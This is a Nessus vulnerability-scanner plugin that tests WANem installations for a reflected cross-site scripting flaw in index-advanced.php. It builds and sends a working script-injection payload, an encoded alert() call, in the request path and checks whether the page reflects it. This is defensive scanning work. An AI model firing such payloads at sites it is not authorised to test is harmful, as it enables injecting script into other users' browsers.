#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(62736);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/01/16 03:36:09 $");

  script_bugtraq_id(56326);
  script_osvdb_id(85346);
  script_xref(name:"EDB-ID", value:"21190");

  script_name(english:"WANem index-advanced.php XSS");
  script_summary(english:"Tries to exploit XSS");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server has a web application that is affected by a
cross-site scripting vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host hosts a version of WANem that is affected by a
cross-site scripting vulnerability.  The index-advanced.php script does
not properly sanitize user-supplied input.  Other scripts on the server
may be affected by cross-site scripting attacks as well. 

An attacker may be able to leverage this to inject arbitrary HTML and
script code into a user's browser to be executed within the security
context of the affected site."
  );
  # http://itsecuritysolutions.org/2012-08-12-WANem-v2.3-multiple-vulnerabilities/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?32a777f5");
  script_set_attribute(
    attribute:"solution",
    value:
"There is no known solution.  As a workaround, either disable or
restrict access to the application."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/08/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/10/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:tata:wanem");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("wanem_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/wanem");
 
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80);

appname = "WANem";

install = get_install_from_kb(
  appname      : 'wanem', 
  port         : port, 
  exit_on_fail : TRUE
);

dir = install['dir'];
install_url = build_url(port:port, qs:dir);

# to get around the handling of quotes
alert_txt_coded = '';
alert_txt = SCRIPT_NAME + '-' + unixtime();

for (i=0; i<strlen(alert_txt); i++)
{
  alert_txt_coded +=string(ord(alert_txt[i]));
  if (i+1 < strlen(alert_txt))
    alert_txt_coded += ',';
}

attack_xss = '><script>alert(String.fromCharCode(' + alert_txt_coded + '));</script><p+';

encoded_attack_xss = urlencode(str:attack_xss, 
                     unreserved:'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.,/+;');

exploit = '/index-advanced.php/%22' + encoded_attack_xss + '%22';

vuln = test_cgi_xss(
         port     : port,
         dirs     : make_list(dir),
         cgi      : exploit,
         pass_str  : attack_xss + '\\"" method="post">',
         ctrl_re  : "<title>TCS WANem GUI</title>",
         no_qm    : TRUE
       );

if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, install_url);
